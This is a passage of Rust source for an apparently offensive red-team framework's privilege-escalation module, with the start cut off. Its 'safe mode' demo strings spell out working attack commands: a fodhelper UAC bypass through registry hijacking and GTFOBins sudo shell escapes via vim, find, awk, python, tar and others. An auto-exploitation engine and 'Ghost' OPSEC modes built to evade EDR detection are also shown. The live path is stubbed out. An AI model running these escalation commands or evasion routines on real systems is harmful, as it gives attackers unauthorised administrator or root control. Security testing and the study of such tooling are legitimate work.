                cleanup_required: true,
                cleanup_commands: vec![
                    r"reg delete HKCU\Software\Classes\ms-settings /f".to_string(),
                ],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn safe_mode_demo(&self, _vector: &PrivEscVector, command: &str) -> String {
        format!(
            r#"=== UAC Bypass via Fodhelper (SAFE MODE DEMO) ===

TECHNIQUE: Registry hijacking of ms-settings protocol handler

STEPS:
1. Create registry key:
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "{}" /f

2. Add DelegateExecute value (empty):
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f

3. Execute fodhelper.exe (auto-elevates):
   C:\Windows\System32\fodhelper.exe

4. Command executes with high integrity level

CLEANUP:
   reg delete HKCU\Software\Classes\ms-settings /f

MITRE ATT&CK: T1548.002 - Bypass User Account Control

[SAFE MODE: No actual changes made]
"#,
            command
        )
    }

    async fn cleanup(&self, result: &PrivEscResult, safe_mode: bool) -> Result<()> {
        if safe_mode {
            info!("[SAFE MODE] Would execute cleanup commands:");
            for cmd in &result.cleanup_commands {
                info!("  {}", cmd);
            }
            return Ok(());
        }
        bail!("Production mode not available");
    }
}

/// Sudo GTFOBins Exploit
pub struct SudoGtfobinsExploit;

#[async_trait]
impl PrivEscExploit for SudoGtfobinsExploit {
    fn name(&self) -> &str {
        "sudo_gtfobins"
    }

    fn target_category(&self) -> VectorCategory {
        VectorCategory::SudoSuid
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn mitre_id(&self) -> &str {
        "T1548.003"
    }

    async fn run(
        &self,
        vector: &PrivEscVector,
        _command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        if safe_mode {
            info!("[SAFE MODE] Would execute sudo GTFOBins exploit");
            return Ok(PrivEscResult {
                success: true,
                new_privilege_level: Some(PrivilegeLevel::System),
                message: self.safe_mode_demo(vector, _command),
                commands_executed: vec!["sudo -l".to_string()],
                cleanup_required: false,
                cleanup_commands: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn safe_mode_demo(&self, _vector: &PrivEscVector, _command: &str) -> String {
        r#"=== Sudo GTFOBins Exploit (SAFE MODE DEMO) ===

TECHNIQUE: Abuse sudo permissions with GTFOBins techniques

COMMON GTFOBINS SUDO EXPLOITS:

1. vim/vi:
   sudo vim -c ':!/bin/bash'

2. find:
   sudo find /etc -exec /bin/bash \;

3. awk:
   sudo awk 'BEGIN {system("/bin/bash")}'

4. python:
   sudo python -c 'import os; os.system("/bin/bash")'

5. nmap (old versions):
   sudo nmap --interactive
   !sh

6. less/more:
   sudo less /etc/passwd
   !/bin/bash

7. tar:
   sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

MITRE ATT&CK: T1548.003 - Sudo and Sudo Caching

[SAFE MODE: No actual changes made]
"#
        .to_string()
    }

    async fn cleanup(&self, _result: &PrivEscResult, _safe_mode: bool) -> Result<()> {
        // No cleanup needed for sudo exploits
        Ok(())
    }
}

// ============================================================================
// Privilege Escalation Engine
// ============================================================================

/// Main privilege escalation engine
pub struct PrivEscEngine {
    enumerators: Vec<Box<dyn PrivEscEnumerator>>,
    exploits: Vec<Box<dyn PrivEscExploit>>,
    discovered_vectors: Vec<PrivEscVector>,
}

impl Default for PrivEscEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl PrivEscEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            enumerators: Vec::new(),
            exploits: Vec::new(),
            discovered_vectors: Vec::new(),
        };

        // Register Windows enumerators
        engine.enumerators.push(Box::new(UacBypassEnumerator));
        engine.enumerators.push(Box::new(TokenEnumerator));
        engine.enumerators.push(Box::new(ServiceVulnEnumerator));

        // Register Linux enumerators
        engine.enumerators.push(Box::new(SudoEnumerator));
        engine.enumerators.push(Box::new(SuidEnumerator));
        engine.enumerators.push(Box::new(KernelEnumerator));
        engine.enumerators.push(Box::new(CapabilitiesEnumerator));

        // Register exploits
        engine.exploits.push(Box::new(FodhelperExploit));
        engine.exploits.push(Box::new(SudoGtfobinsExploit));

        engine
    }

    /// Get enumerators for a specific platform
    pub fn enumerators_for_platform(&self, platform: &Platform) -> Vec<&dyn PrivEscEnumerator> {
        self.enumerators
            .iter()
            .filter(|e| e.platform() == *platform || *platform == Platform::Any)
            .map(|e| e.as_ref())
            .collect()
    }

    /// Enumerate all vectors for a session
    pub async fn enumerate_all(
        &mut self,
        session: &Session,
        safe_mode: bool,
    ) -> Result<Vec<PrivEscVector>> {
        let mut all_vectors = Vec::new();

        let enumerator_names: Vec<String> = self
            .enumerators
            .iter()
            .filter(|e| e.platform() == session.platform || e.platform() == Platform::Any)
            .map(|e| e.name().to_string())
            .collect();

        for name in enumerator_names {
            let enumerator = self
                .enumerators
                .iter()
                .find(|e| e.name() == name)
                .unwrap();

            match enumerator.enumerate(session, safe_mode).await {
                Ok(vectors) => {
                    info!(
                        enumerator = name,
                        count = vectors.len(),
                        "Enumerated vectors"
                    );
                    all_vectors.extend(vectors);
                }
                Err(e) => {
                    warn!(enumerator = name, error = %e, "Failed to enumerate");
                }
            }
        }

        self.discovered_vectors = all_vectors.clone();
        Ok(all_vectors)
    }

    /// Auto-select best exploit for a vector
    pub fn auto_select_exploit(&self, vector: &PrivEscVector) -> Option<&dyn PrivEscExploit> {
        self.exploits
            .iter()
            .find(|e| e.target_category() == vector.category && e.platform() == vector.platform)
            .map(|e| e.as_ref())
    }

    /// Run auto privilege escalation
    pub async fn run_auto(
        &mut self,
        session: &Session,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        // First enumerate
        let vectors = self.enumerate_all(session, safe_mode).await?;

        if vectors.is_empty() {
            return Ok(PrivEscResult {
                success: false,
                new_privilege_level: None,
                message: "No privilege escalation vectors found".to_string(),
                commands_executed: vec![],
                cleanup_required: false,
                cleanup_commands: vec![],
            });
        }

        // Sort by severity and confidence
        let mut sorted = vectors.clone();
        sorted.sort_by(|a, b| {
            let severity_cmp = b.severity.cmp(&a.severity);
            if severity_cmp == std::cmp::Ordering::Equal {
                b.confidence
                    .value()
                    .partial_cmp(&a.confidence.value())
                    .unwrap_or(std::cmp::Ordering::Equal)
            } else {
                severity_cmp
            }
        });

        // Try to exploit best vector
        for vector in &sorted {
            if let Some(exploit) = self.auto_select_exploit(vector) {
                match exploit.run(vector, command, safe_mode).await {
                    Ok(result) if result.success => {
                        info!(
                            exploit = exploit.name(),
                            vector = vector.name,
                            "Privilege escalation successful"
                        );
                        return Ok(result);
                    }
                    Ok(_) => {
                        debug!(exploit = exploit.name(), "Exploit did not succeed");
                    }
                    Err(e) => {
                        warn!(exploit = exploit.name(), error = %e, "Exploit failed");
                    }
                }
            }
        }

        Ok(PrivEscResult {
            success: false,
            new_privilege_level: None,
            message: format!(
                "Found {} vectors but no successful exploitation",
                sorted.len()
            ),
            commands_executed: vec![],
            cleanup_required: false,
            cleanup_commands: vec![],
        })
    }

    /// Get discovered vectors
    pub fn discovered_vectors(&self) -> &[PrivEscVector] {
        &self.discovered_vectors
    }

    // =========================================================================
    // OPSEC Integration Methods
    // =========================================================================

    /// Escalate with Ghost mode OPSEC (maximum stealth)
    ///
    /// Uses Ghost-level OPSEC configuration:
    /// - 45+ second sleep between enumeration steps with 50-80% jitter
    /// - Only high-confidence, low-noise vectors attempted
    /// - EDR-aware execution
    pub async fn escalate_ghost(
        &mut self,
        session: &Session,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        self.escalate_with_opsec(session, command, OpsecConfig::ghost(), safe_mode).await
    }

    /// Escalate with Silent mode OPSEC (high stealth)
    pub async fn escalate_silent(
        &mut self,
        session: &Session,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        self.escalate_with_opsec(session, command, OpsecConfig::silent(), safe_mode).await
    }

    /// Escalate with Quiet mode OPSEC (balanced)
    pub async fn escalate_quiet(
        &mut self,
        session: &Session,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        self.escalate_with_opsec(session, command, OpsecConfig::quiet(), safe_mode).await
    }

    /// Escalate with custom OPSEC configuration
    ///
    /// Applies traffic shaping between enumeration phases and exploit attempts
    /// to avoid detection patterns.
    pub async fn escalate_with_opsec(
        &mut self,
        session: &Session,
        command: &str,
        opsec_config: OpsecConfig,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        let traffic_shaper = DefaultTrafficShaper::new(opsec_config.clone());

        info!(
            stealth_level = %opsec_config.stealth_level.as_str(),
            "Starting OPSEC-aware privilege escalation"
        );

        // Enumerate with OPSEC delays between each enumerator
        let mut all_vectors = Vec::new();

        let enumerator_names: Vec<String> = self
            .enumerators
            .iter()
            .filter(|e| e.platform() == session.platform || e.platform() == Platform::Any)
            .map(|e| e.name().to_string())
            .collect();

        for (idx, name) in enumerator_names.iter().enumerate() {
            // Apply OPSEC delay between enumerators (except first)
            if idx > 0 {
                debug!("Applying OPSEC sleep with jitter before next enumerator");
                traffic_shaper.sleep_with_jitter().await;
            }

            let enumerator = self
                .enumerators
                .iter()
                .find(|e| e.name() == *name)
                .unwrap();

            match enumerator.enumerate(session, safe_mode).await {
                Ok(vectors) => {
                    info!(
                        enumerator = name.as_str(),
                        count = vectors.len(),
                        "OPSEC enumeration found vectors"
                    );
                    all_vectors.extend(vectors);
                }
                Err(e) => {
                    warn!(enumerator = name.as_str(), error = %e, "OPSEC enumeration failed");
                }
            }
        }

        if all_vectors.is_empty() {
            return Ok(PrivEscResult {
                success: false,
                new_privilege_level: None,
                message: "OPSEC enumeration found no privilege escalation vectors".to_string(),
                commands_executed: vec![],
                cleanup_required: false,
                cleanup_commands: vec![],
            });
        }

        self.discovered_vectors = all_vectors.clone();

        // Sort by severity and confidence, prefer high-confidence vectors in OPSEC mode
        let mut sorted = all_vectors;
        sorted.sort_by(|a, b| {
            // In OPSEC mode, prioritize high-confidence vectors to minimize failed attempts
            let conf_cmp = b.confidence.value().partial_cmp(&a.confidence.value())
                .unwrap_or(std::cmp::Ordering::Equal);
            match conf_cmp {
                std::cmp::Ordering::Equal => b.severity.cmp(&a.severity),
                other => other,
            }
        });

        // In Ghost mode, only try the highest-confidence vector
        let max_attempts = match opsec_config.stealth_level {
            crate::modules::evasion::opsec::StealthLevel::Ghost => 1,
            crate::modules::evasion::opsec::StealthLevel::Silent => 2,
            _ => 3,
        };

        // Try to exploit best vectors with OPSEC delays
        for (idx, vector) in sorted.iter().take(max_attempts).enumerate() {
            if idx > 0 {
                debug!("Applying OPSEC sleep with jitter before next exploit attempt");
                traffic_shaper.sleep_with_jitter().await;
            }

            if let Some(exploit) = self.auto_select_exploit(vector) {
                match exploit.run(vector, command, safe_mode).await {
                    Ok(result) if result.success => {
                        info!(
                            exploit = exploit.name(),
                            vector = vector.name,
                            "OPSEC privilege escalation successful"
                        );
                        return Ok(result);
                    }
                    Ok(_) => {
                        debug!(exploit = exploit.name(), "OPSEC exploit did not succeed");
                    }
                    Err(e) => {
                        warn!(exploit = exploit.name(), error = %e, "OPSEC exploit failed");
                    }
                }
            }
        }

        Ok(PrivEscResult {
            success: false,
            new_privilege_level: None,
            message: format!(
                "OPSEC escalation: found {} vectors but no successful exploitation (max attempts: {})",
                sorted.len(),
                max_attempts
            ),
            commands_executed: vec![],
            cleanup_required: false,
            cleanup_commands: vec![],
        })
    }
}

// ============================================================================
// Module Implementation
// ============================================================================

/// Privilege Escalation Module (Module trait implementation)
pub struct PrivilegeEscalationModule {
    options: HashMap<String, String>,
    engine: PrivEscEngine,
}

impl PrivilegeEscalationModule {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("technique".to_string(), "auto".to_string());
        options.insert("safe_mode".to_string(), "true".to_string());
        options.insert("command".to_string(), "cmd.exe".to_string());
        options.insert("platform".to_string(), "auto".to_string());

        Self {
            options,
            engine: PrivEscEngine::new(),
        }
    }
}

impl Default for PrivilegeEscalationModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for PrivilegeEscalationModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "privilege_escalation".to_string(),
            version: "2.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Privilege Escalation Engine - Multi-platform privesc with auto-enumeration. \
                         AUTHORIZED USE ONLY."
                .to_string(),
            module_type: ModuleType::PostExploit,
            category: "privilege".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "technique".to_string(),
                description: "Technique: auto, uac_fodhelper, uac_eventvwr, token, sudo, suid, kernel".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("technique").cloned(),
            },
            ModuleOption {
                name: "safe_mode".to_string(),
                description: "Use safe mode (true/false) - shows reference only".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("safe_mode").cloned(),
            },
            ModuleOption {
                name: "command".to_string(),
                description: "Command to execute with elevated privileges".to_string(),
                required: false,
                default_value: Some("cmd.exe".to_string()),
                current_value: self.options.get("command").cloned(),
            },
            ModuleOption {
                name: "platform".to_string(),
                description: "Target platform: auto, windows, linux".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("platform").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_string(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(name).cloned()
    }

    fn validate(&self) -> Result<()> {
        let safe_mode = self
            .options
            .get("safe_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if !safe_mode {
            bail!("Production mode requires explicit authorization and is not implemented in this reference version");
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        let platform = match self.options.get("platform").map(|s| s.as_str()) {
            Some("windows") => Platform::Windows,
            Some("linux") => Platform::Linux,
            _ => Platform::Any,
        };

        let enumerator_count = self.engine.enumerators_for_platform(&platform).len();

        let mut fingerprint = HashMap::new();
        fingerprint.insert("platform".to_string(), format!("{:?}", platform));
        fingerprint.insert(
            "enumerators_available".to_string(),
            enumerator_count.to_string(),
        );

        Ok(CheckResult {
            vulnerable: true,
            confidence: 0.7,
            details: format!(
                "Privilege Escalation Engine ready\n\
                 Platform: {:?}\n\
                 Available Enumerators: {}\n\
                 [SAFE MODE: Would enumerate actual vectors in production]",
                platform, enumerator_count
            ),
            fingerprint,
        })
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        let safe_mode = self
            .options
            .get("safe_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if !safe_mode {
            bail!("Production mode not available in reference implementation");
        }

        let platform = match self.options.get("platform").map(|s| s.as_str()) {
            Some("windows") => Platform::Windows,
            Some("linux") => Platform::Linux,
            _ => Platform::Windows, // Default for demo
        };

        let command = self
            .options
            .get("command")
            .cloned()
            .unwrap_or_else(|| "cmd.exe".to_string());

        // Create mock session
        let session = Session::new(
            "privilege_escalation".to_string(),
            "target".to_string(),
            platform,
        );

        // Run auto enumeration and exploitation
        let result = self.engine.run_auto(&session, &command, safe_mode).await?;

        let mut module_result =
            ModuleResult::success("Privilege escalation analysis complete (safe mode)".to_string());

        module_result = module_result
            .with_data("success", serde_json::json!(result.success))
            .with_data(
                "vectors_found",
                serde_json::json!(self.engine.discovered_vectors().len()),
            )
            .with_data("message", serde_json::json!(result.message))
            .with_data(
                "commands_executed",
                serde_json::json!(result.commands_executed),
            )
            .with_data("safe_mode", serde_json::json!(true));

        // Add discovered vectors to output
        let vectors_json: Vec<serde_json::Value> = self
            .engine
            .discovered_vectors()
            .iter()
            .map(|v| {
                serde_json::json!({
                    "name": v.name,
                    "category": format!("{:?}", v.category),
                    "severity": v.severity.as_str(),
                    "confidence": v.confidence.value(),
                    "mitre_id": v.mitre_id,
                })
            })
            .collect();

        module_result = module_result.with_data("vectors", serde_json::json!(vectors_json));

        Ok(module_result)
    }

    async fn cleanup(&mut self) -> Result<()> {
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        true
    }
}

// Keep the old PrivilegeEscalation for backwards compatibility
pub use PrivilegeEscalationModule as PrivilegeEscalation;

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
    }

    #[test]
    fn test_confidence_values() {
        assert!(Confidence::high().value() > Confidence::medium().value());
        assert!(Confidence::medium().value() > Confidence::low().value());
        assert!(Confidence::low().value() > Confidence::unknown().value());
    }

    #[test]
    fn test_engine_creation() {
        let engine = PrivEscEngine::new();
        assert!(!engine.enumerators.is_empty());
        assert!(!engine.exploits.is_empty());
    }

    #[test]
    fn test_platform_filtering() {
        let engine = PrivEscEngine::new();

        let windows_enums = engine.enumerators_for_platform(&Platform::Windows);
        let linux_enums = engine.enumerators_for_platform(&Platform::Linux);

        assert!(!windows_enums.is_empty());
        assert!(!linux_enums.is_empty());

        // Windows enumerators should be different from Linux
        let win_names: Vec<_> = windows_enums.iter().map(|e| e.name()).collect();
        let lin_names: Vec<_> = linux_enums.iter().map(|e| e.name()).collect();

        assert!(win_names.contains(&"uac_bypass"));
        assert!(lin_names.contains(&"sudo_abuse"));
    }

    #[tokio::test]
    async fn test_enumeration_safe_mode() {
        let mut engine = PrivEscEngine::new();
        let session = Session::new(
            "test".to_string(),
            "target".to_string(),
            Platform::Windows,
        );

        let vectors = engine.enumerate_all(&session, true).await.unwrap();
        assert!(!vectors.is_empty());
    }

    #[tokio::test]
    async fn test_module_safe_mode() {
        let mut module = PrivilegeEscalationModule::new();
        module.set_option("safe_mode", "true").unwrap();
        module.set_option("platform", "windows").unwrap();

        assert!(module.validate().is_ok());

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("vectors_found"));
    }

    #[test]
    fn test_vector_creation() {
        let vector = PrivEscVector::new(
            "Test Vector",
            "Test description",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        )
        .with_confidence(Confidence::high())
        .with_detail("test_key", "test_value");

        assert_eq!(vector.name, "Test Vector");
        assert_eq!(vector.confidence.value(), 0.9);
        assert!(vector.details.contains_key("test_key"));
    }

    #[test]
    fn test_mitre_ids() {
        let fodhelper = FodhelperExploit;
        assert_eq!(fodhelper.mitre_id(), "T1548.002");

        let sudo = SudoGtfobinsExploit;
        assert_eq!(sudo.mitre_id(), "T1548.003");
    }

    #[test]
    fn test_reference_generation() {
        let uac_enum = UacBypassEnumerator;
        let reference = uac_enum.generate_reference();
        assert!(reference.contains("UAC Bypass"));
        assert!(reference.contains("MITRE ATT&CK"));

        let sudo_enum = SudoEnumerator;
        let reference = sudo_enum.generate_reference();
        assert!(reference.contains("Sudo"));
        assert!(reference.contains("GTFOBins"));
    }

    #[tokio::test]
    async fn test_exploit_safe_mode_demo() {
        let fodhelper = FodhelperExploit;
        let vector = PrivEscVector::new(
            "UAC Bypass - Fodhelper",
            "Test",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        );

        let result = fodhelper.run(&vector, "cmd.exe", true).await.unwrap();
        assert!(result.success);
        assert!(result.cleanup_required);
        assert!(!result.cleanup_commands.is_empty());
    }
}
